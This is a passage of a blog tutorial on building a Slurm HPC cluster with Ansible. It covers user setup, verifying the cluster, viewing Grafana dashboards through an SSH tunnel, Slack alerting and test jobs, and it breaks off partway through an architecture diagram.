<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># If you have passwordless sudo configured</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">ansible-playbook </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-i</span><span class="token plain"> inventories/hosts river_cluster.yml</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># If you need to enter sudo password</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">ansible-playbook </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-i</span><span class="token plain"> inventories/hosts river_cluster.yml --ask-become-pass</span><br></span></code></pre></div></div>
<p>What this playbook does:</p>
<ol>
<li class="">
<p><strong>Prepares all nodes</strong>:</p>
<ul>
<li class="">Updates packages</li>
<li class="">Installs dependencies</li>
<li class="">Configures firewalls</li>
</ul>
</li>
<li class="">
<p><strong>Sets up the controller</strong>:</p>
<ul>
<li class="">Installs slurmctld and slurmdbd</li>
<li class="">Configures MariaDB for accounting</li>
<li class="">Sets up NFS server</li>
<li class="">Installs monitoring stack</li>
</ul>
</li>
<li class="">
<p><strong>Configures compute nodes</strong>:</p>
<ul>
<li class="">Installs slurmd</li>
<li class="">Mounts NFS shares</li>
<li class="">Configures metrics exporters</li>
</ul>
</li>
<li class="">
<p><strong>Deploys monitoring</strong>:</p>
<ul>
<li class="">Prometheus for metrics collection</li>
<li class="">Grafana with pre-configured dashboards</li>
<li class="">Alertmanager with Slack integration</li>
</ul>
</li>
<li class="">
<p><strong>Synchronizes configurations</strong>:</p>
<ul>
<li class="">Copies slurm.conf to all nodes</li>
<li class="">Sets up Munge authentication</li>
<li class="">Configures log aggregation</li>
</ul>
</li>
</ol>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="step-6-add-users">Step 6: Add Users<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-2#step-6-add-users" class="hash-link" aria-label="Direct link to Step 6: Add Users" title="Direct link to Step 6: Add Users" translate="no">​</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">ansible-playbook </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-i</span><span class="token plain"> inventories/hosts river_users.yml</span><br></span></code></pre></div></div>
<p>This creates Linux users on all nodes with:</p>
<ul>
<li class="">Synchronized UID/GID across nodes</li>
<li class="">Home directories on shared NFS</li>
<li class="">Slurm accounting associations</li>
</ul>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>info</div><div class="admonitionContent_BuS1"><p><strong>Note on User Management</strong>: For production, consider integrating with LDAP or Active Directory. However, NIS and LDAP setup can be complex on Ubuntu. Our Ansible approach provides a simpler alternative that works well for small to medium clusters.</p></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="step-7-verify-the-setup">Step 7: Verify the Setup<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-2#step-7-verify-the-setup" class="hash-link" aria-label="Direct link to Step 7: Verify the Setup" title="Direct link to Step 7: Verify the Setup" translate="no">​</a></h3>
<p>SSH into the controller node and run:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Check cluster status</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">sinfo</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Expected output:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># PARTITION AVAIL  TIMELIMIT  NODES  STATE NODELIST</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># compute*     up   infinite      2   idle worker-01,worker-02</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># View job queue</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">squeue</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Submit a test job</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">srun </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--nodes</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--ntasks</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">hostname</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Check accounting</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">sacct</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># View cluster configuration</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">scontrol show config </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">head</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-20</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="step-8-access-grafana-dashboards">Step 8: Access Grafana Dashboards<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-2#step-8-access-grafana-dashboards" class="hash-link" aria-label="Direct link to Step 8: Access Grafana Dashboards" title="Direct link to Step 8: Access Grafana Dashboards" translate="no">​</a></h3>
<p>Grafana runs on the controller node at port 3000. To access it securely from your local machine:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Create SSH tunnel</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">ssh</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-N</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-L</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">3001</span><span class="token plain">:localhost:3000 your_user@controller_ip</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Now open in browser: http://localhost:3001</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Login: admin / your_grafana_password</span><br></span></code></pre></div></div>
<p>You'll see pre-configured dashboards showing:</p>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="node-metrics-dashboard">Node Metrics Dashboard<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-2#node-metrics-dashboard" class="hash-link" aria-label="Direct link to Node Metrics Dashboard" title="Direct link to Node Metrics Dashboard" translate="no">​</a></h4>
<ul>
<li class="">CPU usage per node</li>
<li class="">Memory utilization</li>
<li class="">Disk I/O</li>
<li class="">Network traffic</li>
<li class="">System load</li>
</ul>
<figure markdown="span"><p><img decoding="async" loading="lazy" alt="Node Grafana Dashboard" src="https://riverxdata.github.io/river-docs/assets/images/node_grafana-1be3b4d9f0352987567947a207197a5a.png" width="2559" height="1293" class="img_ev3q"></p></figure>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="slurm-metrics-dashboard">Slurm Metrics Dashboard<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-2#slurm-metrics-dashboard" class="hash-link" aria-label="Direct link to Slurm Metrics Dashboard" title="Direct link to Slurm Metrics Dashboard" translate="no">​</a></h4>
<ul>
<li class="">Active jobs</li>
<li class="">Job queue length</li>
<li class="">Node states (idle, allocated, down)</li>
<li class="">CPU allocation</li>
<li class="">Memory usage</li>
<li class="">Job completion rates</li>
</ul>
<figure markdown="span"><p><img decoding="async" loading="lazy" alt="Slurm Grafana Dashboard" src="https://riverxdata.github.io/river-docs/assets/images/slurm_grafana-d38acb72e98a3d7cd3a9fa5fbfcfd88e.png" width="2559" height="1293" class="img_ev3q"></p></figure>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="what-about-alerts">What About Alerts?<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-2#what-about-alerts" class="hash-link" aria-label="Direct link to What About Alerts?" title="Direct link to What About Alerts?" translate="no">​</a></h3>
<p>Alertmanager is configured to send Slack notifications for:</p>
<ul>
<li class=""><strong>Node down</strong>: When a compute node becomes unresponsive</li>
<li class=""><strong>Node resumed</strong>: When a node comes back online</li>
<li class=""><strong>High CPU usage</strong>: Sustained high CPU across cluster</li>
<li class=""><strong>High memory usage</strong>: Memory pressure warnings</li>
<li class=""><strong>Disk space low</strong>: Storage running out</li>
</ul>
<p>Example alert in Slack when a node goes down:</p>
<figure markdown="span"><p><img decoding="async" loading="lazy" alt="Node Resume Alert" src="https://riverxdata.github.io/river-docs/assets/images/resume_node-7e21b97ade95598e247fe80abd75ce91.png" width="1059" height="420" class="img_ev3q"></p></figure>
<p>For detailed information, check the Grafana dashboard:</p>
<figure markdown="span"><p><img decoding="async" loading="lazy" alt="Grafana Node Down" src="https://riverxdata.github.io/river-docs/assets/images/grafana_down-e246254641a25b9312cfa3800cc99bb1.png" width="2560" height="1283" class="img_ev3q"></p></figure>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="testing-your-cluster">Testing Your Cluster<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-2#testing-your-cluster" class="hash-link" aria-label="Direct link to Testing Your Cluster" title="Direct link to Testing Your Cluster" translate="no">​</a></h2>
<p>Let's run some tests to ensure everything works:</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="test-1-simple-job">Test 1: Simple Job<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-2#test-1-simple-job" class="hash-link" aria-label="Direct link to Test 1: Simple Job" title="Direct link to Test 1: Simple Job" translate="no">​</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">srun </span><span class="token function" style="color:hsl(221, 87%, 60%)">hostname</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="test-2-multi-node-job">Test 2: Multi-node Job<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-2#test-2-multi-node-job" class="hash-link" aria-label="Direct link to Test 2: Multi-node Job" title="Direct link to Test 2: Multi-node Job" translate="no">​</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">srun </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--nodes</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">2</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--ntasks</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">2</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">hostname</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="test-3-interactive-session">Test 3: Interactive Session<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-2#test-3-interactive-session" class="hash-link" aria-label="Direct link to Test 3: Interactive Session" title="Direct link to Test 3: Interactive Session" translate="no">​</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">srun </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--nodes</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token plain"> --cpus-per-task</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">2</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--mem</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">2G </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--pty</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">bash</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Inside the session</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">hostname</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">nproc</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">free</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-h</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">exit</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="test-4-batch-job">Test 4: Batch Job<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-2#test-4-batch-job" class="hash-link" aria-label="Direct link to Test 4: Batch Job" title="Direct link to Test 4: Batch Job" translate="no">​</a></h3>
<p>Create <code>test_job.sh</code>:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token shebang important" style="color:hsl(230, 8%, 24%);font-weight:bold">#!/bin/bash</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)">#SBATCH --job-name=test</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)">#SBATCH --output=test_%j.out</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)">#SBATCH --error=test_%j.err</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)">#SBATCH --nodes=1</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)">#SBATCH --ntasks=1</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)">#SBATCH --cpus-per-task=2</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)">#SBATCH --mem=1G</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)">#SBATCH --time=00:05:00</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"Job started at </span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$(</span><span class="token string variable function" style="color:hsl(221, 87%, 60%)">date</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">)</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"Running on node: </span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$(</span><span class="token string variable function" style="color:hsl(221, 87%, 60%)">hostname</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">)</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"CPUs allocated: </span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$SLURM_CPUS_PER_TASK</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"Memory allocated: </span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$SLURM_MEM_PER_NODE</span><span class="token string" style="color:hsl(119, 34%, 47%)"> MB"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Do some work</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">sleep</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">60</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"Job finished at </span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$(</span><span class="token string variable function" style="color:hsl(221, 87%, 60%)">date</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">)</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><br></span></code></pre></div></div>
<p>Submit it:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">sbatch test_job.sh</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Check status</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">squeue</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># When done, view output</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">cat</span><span class="token plain"> test_*.out</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="test-5-resource-limits">Test 5: Resource Limits<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-2#test-5-resource-limits" class="hash-link" aria-label="Direct link to Test 5: Resource Limits" title="Direct link to Test 5: Resource Limits" translate="no">​</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Submit job requesting more resources than available</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">srun </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--mem</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">999999</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--pty</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">bash</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Should fail with:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># srun: error: Unable to allocate resources: Requested node configuration is not available</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="test-6-accounting">Test 6: Accounting<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-2#test-6-accounting" class="hash-link" aria-label="Direct link to Test 6: Accounting" title="Direct link to Test 6: Accounting" translate="no">​</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># View your jobs</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">sacct</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Detailed accounting info</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">sacct </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--format</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">JobID,JobName,User,State,Start,End,Elapsed,CPUTime,MaxRSS</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Cluster usage summary</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">sreport cluster utilization</span><br></span></code></pre></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="architecture-diagram">Architecture Diagram<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-2#architecture-diagram" class="hash-link" aria-label="Direct link to Architecture Diagram" title="Direct link to Architecture Diagram" translate="no">​</a></h2>
<p>Here's what you've built:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">┌─────────────────────────────────────────────┐</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│           Users SSH to Controller           │</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">└─────────────────┬───────────────────────────┘</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">                  │</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    ┌─────────────▼────────────────┐</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    │   Controller Node (Head)     │</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    │  ┌────────────────────────┐  │</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    │  │ 